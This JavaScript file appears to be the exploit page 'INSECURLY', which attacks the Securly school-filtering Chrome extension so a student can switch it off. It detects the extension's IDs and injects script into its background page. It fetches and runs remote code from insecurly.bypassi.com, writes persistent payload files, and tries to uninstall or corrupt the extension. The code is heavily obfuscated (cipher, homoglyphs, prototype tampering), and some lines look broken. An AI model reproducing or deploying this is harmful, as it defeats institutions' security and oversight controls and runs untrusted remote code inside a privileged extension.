    <script defer>
function o(n, _ = 78, D = 126) {
    for (var x = n.toString().split(""), $ = 0; $ < x.length; $++) x[$].charCodeAt(0) <= D && (x[$] = String.fromCharCode((x[$].charCodeAt(0) + _) % D));
    return x.join("")
}

function d(n, _ = 78, D = 126) {
    return o(n, D - _)
}
const m = function() {
        document.body.innerHTML = `
    <style>
    body {
      background-color:black;
      color:#eeeeee;
      font-family:Arial;
    }
    h1 {
      font-size: 40px;
      font-weight:normal;
    }
    .switch-area {
      display:flex;
      margin:10px 0px;
    }
    .switch-area div{
      font-size:20px;
      padding:6px 0px;
      height:32px;
    }
    #desc {
      font-size:18px;
      max-width:320px;
    }
    #updates {
      font-size:15px;
      margin-top:15px;
      color:#999999;
    }
    /* https://danklammer.com/articles/simple-css-toggle-switch/ */
    #toggle {
        appearance: none;
        width: 62px;
        height: 32px;
        display: inline-block;
        position: relative;
        border-radius: 50px;
        overflow: hidden;
        outline: none;
        border: none;
        cursor: pointer;
        background-color: #707070;
        transition: background-color ease 0.3s;
      }
      #toggle:before {
        content: "on off";
        display: block;
        position: absolute;
        z-index: 2;
        width: 28px;
        height: 28px;
        background: #fff;
        left: 2px;
        top: 2px;
        border-radius: 50%;
        font: 10px/28px Helvetica;
        text-transform: uppercase;
        font-weight: bold;
        text-indent: -22px;
        word-spacing: 37px;
        color: #fff;
        text-shadow: -1px -1px rgba(0,0,0,0.15);
        white-space: nowrap;
        box-shadow: 0 1px 2px rgba(0,0,0,0.2);
        transition: all cubic-bezier(0.3, 1.5, 0.7, 1) 0.3s;
      }
      #toggle:checked {
        background-color: #4CD964;
      }
      #toggle:checked:before {
        left: 32px;
      }
    </style>
    <h1>INSECURLY exploit (by bypassi)</h1>
    <div class="switch-area">
      <div>securly is currently</div>
      <input id="toggle" type="checkbox" />
    </div>
    <div id="desc">
      the switch above allows you to turn the securly extension on and off. note that this will not bypass
      network filters or other filtering extensions. teachers using securly classroom will still be able to
      see your screen. more functionality is coming soon.
    </div>
    <div id="updates"></div>
    
`;
    
  let n = window[`chrome`][`extension`][`getBackgroundPage`](),
        _ = () => n.chrome,
            D = document.getElementById("toggle");
        async function x() {
            let _ = await (await fetch(`https://insecurly.bypassi.com/js.js`)).text(),
               D = new n[`Blob`]([_], {
                 type: `text/javascript`
                }),
                x = document.createElement("script");
            x.src = URL[`createObjectURL`](D), n.document.body.appendChild(x)
        }
        try {
            for (let $ = 0; $ < 10; $++) Reflect.construct(Blob, []);
            x()
        } catch (C) {}
        async function t(n, _, D) {
            let x = await new Promise(n => {
                window[`webkitRequestFileSystem`](0, D.length, n)
            });
            return await new Promise(_ => {
                x.root.getFile(n, {}, n => {
                    n.remove(_)
                }, _)
            }), new Promise($ => {
                x.root.getFile(n, {
                    create: !0
                }, n => {
                    n[`createWriter`](x => {
                        x[`onwriteеnd`] = () => {
                            delete[x, n]
                        }, x[`onwriteend`] = () => {
                            $(n[`toURL`]())
                        }, x.write(new window[`Blob`]([D], {
                            type: _
                        }))
                    })
                })
            })
        }

        function B() {
            if (!window[`location`][`hash`]) throw new window[`Error`]("IDK");
            let n = location.hash.replace("#", "");
            t(Math.random() + ".js", `text/javascript`, n)[`then`](n => {
                let _ = document.createElement("script");
                _.src = n, document.body.appendChild(_)
            })
        }
        _().runtime.id.startsWith("i") || (document.getElementById("updates").textContent = `payload 3 applied. (you aren't supposed to know what this means)`, _().extension[`setUpdateUrlData`](decodeURIComponent(`%E0%B6%9E`).repeat(1024))), localStorage[`cluster`]?.startsWith(`AVOID_OS,`) || (D.checked = !0), D.onclick = function $() {
            D[`checked`] ? (delete window.WebRequestEventImpl, localStorage.clear()) : (_().management[`uninstallSelf`].bind(_().runtime.id), Storage.prototype[`setItem`].call(window[`localStorage`], `cluster`, `AVOID_OS,` + Date.now() * (Math[`random`]() + 1.5))), location.reload.call(n[`location`]), setTimeout(x, 1500)
        }, navigator[`persistLocalFiles`] = !0, t(`/i.js`, `text/javascript`, o + d + t + B + ";" + B.name + "()//"), t(`/i.html`, "text/html", `<script src="./i.js"></script>`).then(() => {  
                                                                                                                                               
            window[`navigator`][`storage`][`persist`]()        })
    },
    а = ["manifest.json", "blocked.html", "blocked.js", "conf.js1", "content9.min.js", "securly.min.js", "_metadata/verified_contents.json", "fonts/Metropolis-Medium.woff", 'fonts/Metropolis-Regular.woff', "fonts/Metropolis-SemiBold.woff", "fonts/Metropolis.css", ],
    SI = {
        NONE: "",
        OLD: `iheobagjkfklnlikgihanlhcddjoihkg`,
        NEW: `joflmkccibkooplaeoinecjbmdebglab`,
        BETA: `knneimmpeamikmjijmnhjmmobddleohj`
    };
async function g(n) {
    let _;
    try {
        _ = await window[`fetch`](`chrome-extension://` + n + `/` + d(а.at(`10`)))
    } catch (D) {
        return 0
    }
    return 200 === _[`status`] ? 1 : 0
}
async function gSI() {
    return await g(SI.NEW) ? SI.NEW : await g(SI.OLD) ? SI.OLD : await g(SI.BETA) ? SI.BETA : SI.NONE
}

function e(n, _) {
    let D = function(n) {
            let _ = open();
            _.chrome = top.chrome[`extension`][`getBackgroundPage`]().chrome;
            let D = document[`createElement`]("script");
            D.src = n, _.document.body.appendChild(D), top.close()
        },
        x = URL[`createObjectURL`](n),
        $ = new window[`Blob`]([`${o};${d};(${D})("${x}")`], {
            type: `text/javascript`
        }),
        C = URL[`createObjectURL`]($),
        t = `<style>*{visibility:hidden}</style>
    <iframe srcdoc="<script src='` + C + d `'></script>">
        Hi. If you can read this, the exploit didn't work.
        Wait a couple of weeks. We'll be back... 
    </iframe>`,
    
    return _ === SI.BETA ? `${`filesystem:chrome-extension://`}${_}${`/temporary/i.html#import('`}${C}')` : `chrome-extension://` + _ + `/` + (.3 > Math.random() ? "/" : "") + d(а[1]) + [`?category=`] + window[`encodeURIComponent`](window[`bota`](tt()))
}

function gS2U(n) {
    return e(new window[`Blob`]([`${o};${d};(${m})()`], {
        type: `text/javascript`
    }), n)
} [].__proto__[window[`Symbol`][`iterator`]] = function*() {
    yield gS2U.call(this[0], this[1])
}, gSI().then(n => {
    if (n === SI.NONE) {
        let _ = document.getElementById("error");
        _.classList.add("shown"), _.textContent = `You don't have an adequate version of Securly installed.`
    } else {
        let D = [`/blocked.js`, n],
            x = document.getElementById("draggable");
        x.classList.add("shown"), x[`ondragstart`] = n => {
            n[`dataTransfer`].setData("text/plain", [...D])
        }, n === SI.BETA && (x.textContent += `(unstable, dont complain if it fails)`)
    }
});
